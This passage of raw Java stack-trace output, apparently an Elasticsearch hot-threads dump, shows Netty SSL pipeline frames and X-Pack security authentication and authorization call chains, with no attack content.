       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)
     3/10 snapshots sharing following 333 elements
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group.lambda$buildIndexMatcherPredicateForAction$0(IndicesPermission.java:453)
       org.elasticsearch.xpack.core.security.authz.permission.IndicesPermission$Group$$Lambda$5211/0x000000080180e168.test(Unknown Source)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:520)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.shardExecute(TransportBroadcastReplicationAction.java:118)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:111)
       app//org.elasticsearch.action.support.replication.TransportBroadcastReplicationAction.doExecute(TransportBroadcastReplicationAction.java:52)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:179)
       app//org.elasticsearch.action.support.ActionFilter$Simple.apply(ActionFilter.java:53)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$apply$0(SecurityActionFilter.java:87)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4859/0x0000000801606ba0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$authorizeRequest$4(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4864/0x0000000801607698.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$15(AuthorizationService.java:365)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5216/0x00000008018386d8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.SearchRequestInterceptor.intercept(SearchRequestInterceptor.java:19)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.BulkShardRequestInterceptor.intercept(BulkShardRequestInterceptor.java:75)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor.intercept(FieldAndDocumentLevelSecurityRequestInterceptor.java:65)
       org.elasticsearch.xpack.security.authz.interceptor.UpdateRequestInterceptor.intercept(UpdateRequestInterceptor.java:23)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.IndicesAliasesRequestInterceptor.intercept(IndicesAliasesRequestInterceptor.java:106)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$runRequestInterceptors$14(AuthorizationService.java:360)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5214/0x0000000801838278.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.lambda$done$0(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$$Lambda$4740/0x0000000801759ad8.accept(Unknown Source)
       java.base@15/java.util.ArrayList.forEach(ArrayList.java:1511)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.done(ListenableFuture.java:98)
       app//org.elasticsearch.common.util.concurrent.BaseFuture.set(BaseFuture.java:144)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.onResponse(ListenableFuture.java:127)
       app//org.elasticsearch.action.StepListener.innerOnResponse(StepListener.java:62)
       app//org.elasticsearch.action.NotifyOnceListener.onResponse(NotifyOnceListener.java:40)
       org.elasticsearch.xpack.security.authz.interceptor.ResizeRequestInterceptor.intercept(ResizeRequestInterceptor.java:86)
       org.elasticsearch.xpack.security.authz.AuthorizationService.runRequestInterceptors(AuthorizationService.java:366)
       org.elasticsearch.xpack.security.authz.AuthorizationService.handleIndexActionAuthorizationResult(AuthorizationService.java:343)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$9(AuthorizationService.java:285)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5199/0x0000000801826b60.accept(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:641)
       org.elasticsearch.xpack.security.authz.AuthorizationService$AuthorizationResultListener.onResponse(AuthorizationService.java:616)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.buildIndicesAccessControl(RBACEngine.java:541)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$3(RBACEngine.java:321)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5203/0x0000000801827430.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService.resolveIndexNames(AuthorizationService.java:579)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$6(AuthorizationService.java:273)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5207/0x0000000801827cf0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.lambda$getAsync$0(AuthorizationService.java:678)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier$$Lambda$5205/0x0000000801827890.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:352)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:269)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5197/0x0000000801826710.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$8(AuthorizationService.java:272)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$5198/0x0000000801826938.getAsync(Unknown Source)
       org.elasticsearch.xpack.security.authz.AuthorizationService$CachingAsyncSupplier.getAsync(AuthorizationService.java:676)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$authorizeIndexAction$4(RBACEngine.java:313)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$5201/0x0000000801826fd0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexActionName(RBACEngine.java:337)
       org.elasticsearch.xpack.security.authz.RBACEngine.authorizeIndexAction(RBACEngine.java:310)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorizeAction(AuthorizationService.java:283)
       org.elasticsearch.xpack.security.authz.AuthorizationService.maybeAuthorizeRunAs(AuthorizationService.java:248)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorize$1(AuthorizationService.java:212)
       org.elasticsearch.xpack.security.authz.AuthorizationService$$Lambda$4866/0x0000000801607af8.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.security.authz.RBACEngine.lambda$resolveAuthorizationInfo$1(RBACEngine.java:123)
       org.elasticsearch.xpack.security.authz.RBACEngine$$Lambda$4868/0x00000008017d0040.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authz.store.CompositeRolesStore.getRoles(CompositeRolesStore.java:274)
       org.elasticsearch.xpack.security.authz.RBACEngine.getRoles(RBACEngine.java:129)
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizationInfo(RBACEngine.java:117)
       org.elasticsearch.xpack.security.authz.AuthorizationService.authorize(AuthorizationService.java:214)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.authorizeRequest(SecurityActionFilter.java:173)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.lambda$applyInternal$3(SecurityActionFilter.java:159)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter$$Lambda$4862/0x0000000801607238.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:323)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83)
       app//org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72)
       app//org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:409)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.execute(AbstractClient.java:1274)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.refresh(AbstractClient.java:1585)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction.lambda$prepareRequest$0(RestRefreshAction.java:60)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction$$Lambda$6003/0x000000080192ed78.accept(Unknown Source)
       app//org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:115)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$0(SecurityRestFilter.java:76)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5235/0x000000080183abe0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.lambda$authenticateAndAttachToContext$2(SecondaryAuthenticator.java:82)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator$$Lambda$5259/0x000000080183e090.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticate(SecondaryAuthenticator.java:92)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticateAndAttachToContext(SecondaryAuthenticator.java:77)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$2(SecurityRestFilter.java:70)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5087/0x00000008017d7498.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$writeAuthToContext$24(AuthenticationService.java:680)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5234/0x000000080183a9b8.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.writeAuthToContext(AuthenticationService.java:695)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.finishAuthentication(AuthenticationService.java:669)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeUser(AuthenticationService.java:616)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$16(AuthenticationService.java:493)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5137/0x000000080181e560.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:120)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:459)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5152/0x000000080181f6e0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$1(CachingUsernamePasswordRealm.java:146)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5225/0x0000000801838f88.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.handleCachedAuthentication(CachingUsernamePasswordRealm.java:197)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$2(CachingUsernamePasswordRealm.java:138)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5176/0x0000000801823490.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.addListener(ListenableFuture.java:68)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:133)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:104)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$15(AuthenticationService.java:448)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5133/0x000000080181dc60.accept(Unknown Source)
       org.elasticsearch.xpack.core.common.IteratingActionListener.run(IteratingActionListener.java:102)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:503)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5130/0x000000080181d5d8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$11(AuthenticationService.java:415)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5132/0x000000080181da38.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:425)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$checkForApiKey$3(AuthenticationService.java:366)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5116/0x000000080181b4f0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.ApiKeyService.authenticateWithApiKeyIfPresent(ApiKeyService.java:342)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.checkForApiKey(AuthenticationService.java:347)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$0(AuthenticationService.java:329)
